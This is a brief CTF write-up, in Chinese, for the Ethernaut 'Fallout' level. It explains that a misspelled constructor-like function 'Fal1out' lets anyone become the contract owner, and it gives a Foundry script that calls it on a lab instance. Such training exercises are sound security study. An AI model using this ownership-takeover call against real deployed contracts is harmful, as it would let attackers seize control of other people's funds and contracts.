# Fallout

https://ethernaut.openzeppelin.com/level/0x676e57FdBbd8e5fE1A7A3f4Bb1296dAC880aa639

通过查看合约，发现合约有一个`Fal1out`函数，这个函数会修改合约的owner，可以被直接调用

```solidity
pragma solidity ^0.6.0;

import {Fallout} from "../src/Fallout.sol";
import {Script} from "forge-std/Script.sol";

contract FallbackScript is Script {
    // instance id: 0x08735fa537C1Dbe96316C277F4B377cA671031b8
    Fallout public fallout = Fallout(payable(0x08735fa537C1Dbe96316C277F4B377cA671031b8));

    function setUp() public {
    }

    function run() public {
        vm.startBroadcast();
        fallout.Fal1out();
        vm.stopBroadcast();
    }
}
```